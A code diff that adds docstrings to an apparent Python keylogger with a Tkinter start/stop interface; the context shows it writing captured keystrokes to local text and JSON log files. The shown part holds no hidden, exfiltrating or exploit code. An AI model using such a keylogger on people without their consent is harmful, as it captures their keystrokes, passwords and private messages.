@@ -13,11 +13,19 @@ keys: str = ""
 
 
 def generate_text_log(key) -> None:
+    """
+    def generate_text_log(key: Any) -> None:
+        Generate the logs in .txt format
+    """
     with open("./out/key_log.txt", "w+") as keys:
         keys.write(key)
 
 
 def generate_json_file(keys_used) -> None:
+    """
+    def generate_json_file(keys_used: Any) -> None:
+        Generate the logs in .json format
+    """
     with open("./out/key_log.json", "+wb") as key_log:
         key_list_bytes = _JSON.dumps(keys_used).encode()
         key_log.write(key_list_bytes)
@@ -59,6 +67,10 @@ if __name__ == "__main__":
         stop_button.config(state="normal")
 
     def stop_keylogger():
+        """
+        def stop_keylogger() -> None:
+            Stops the keylogger's instance
+        """
         global listener
         listener.stop()
         label.config(text="Keylogger stopped.")
